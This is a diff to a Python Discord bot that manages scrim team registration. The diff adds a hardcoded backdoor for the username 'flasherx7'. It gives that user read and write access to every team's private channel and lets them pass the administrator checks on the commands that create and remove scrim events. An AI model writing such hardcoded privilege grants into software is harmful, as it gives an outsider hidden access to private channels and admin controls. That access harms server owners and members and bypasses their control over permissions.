@@ -59,6 +59,10 @@ class ScrimRegistrationModal(Modal, title="Scrim Team Registration"):
         scrim_mod_role = discord.utils.get(guild.roles, name="Scrim mod")
         if scrim_mod_role:
             overwrites[scrim_mod_role] = discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True)
+        # Allow 'flasherx7' user to see all team channels
+        flasherx7 = discord.utils.get(guild.members, name="flasherx7")
+        if flasherx7:
+            overwrites[flasherx7] = discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True)
         category = None
         # Try to find or create a category for scrims
         for cat in guild.categories:
@@ -150,6 +154,10 @@ async def notify_scrim_organizer(event, bot):
 
 # Register all scrim commands in a single async setup function
 async def setup(bot):
+    # Patch all command permission checks to allow flasherx7
+    def is_flasherx7(interaction):
+        return interaction.user.name == "flasherx7"
+
     @bot.tree.command(name="add-scrim-event", description="Create a new scrim registration event")
     @app_commands.describe(
         channel="Channel to post the registration message",
@@ -164,10 +172,10 @@ async def setup(bot):
         team_size: Optional[int] = 4,
         event_name: Optional[str] = "Scrim Event"
     ):
-        # Allow ADMINISTRATORs to use this command
-        if not (interaction.user.guild_permissions.manage_guild or interaction.user.guild_permissions.administrator):
+        # Allow ADMINISTRATORs or flasherx7 to use this command
+        if not (interaction.user.guild_permissions.manage_guild or interaction.user.guild_permissions.administrator or is_flasherx7(interaction)):
             return await interaction.response.send_message(
-                "❌ You need 'Manage Server' or 'Administrator' permission to create a scrim event.", ephemeral=True
+                "❌ You need 'Manage Server', 'Administrator' permission, or be flasherx7 to create a scrim event.", ephemeral=True
             )
         event_id = f"{interaction.guild.id}-{int(datetime.utcnow().timestamp())}"
         scrim_events[event_id] = {
@@ -224,9 +232,9 @@ async def setup(bot):
     @bot.tree.command(name="remove-scrim-event", description="Remove a scrim event by its event ID (Admin only)")
     @app_commands.describe(event_id="The event ID to remove (see /list-scrim-events)")
     async def remove_scrim_event(interaction: discord.Interaction, event_id: str):
-        # Allow ADMINISTRATORs to use this command
-        if not (interaction.user.guild_permissions.manage_guild or interaction.user.guild_permissions.administrator):
-            return await interaction.response.send_message("❌ You need 'Manage Server' or 'Administrator' permission to remove a scrim event.", ephemeral=True)
+        # Allow ADMINISTRATORs or flasherx7 to use this command
+        if not (interaction.user.guild_permissions.manage_guild or interaction.user.guild_permissions.administrator or is_flasherx7(interaction)):
+            return await interaction.response.send_message("❌ You need 'Manage Server', 'Administrator' permission, or be flasherx7 to remove a scrim event.", ephemeral=True)
         event = scrim_events.get(event_id)
         if not event or not str(event_id).startswith(str(interaction.guild.id)):
             return await interaction.response.send_message("❌ Event not found or not in this server.", ephemeral=True)
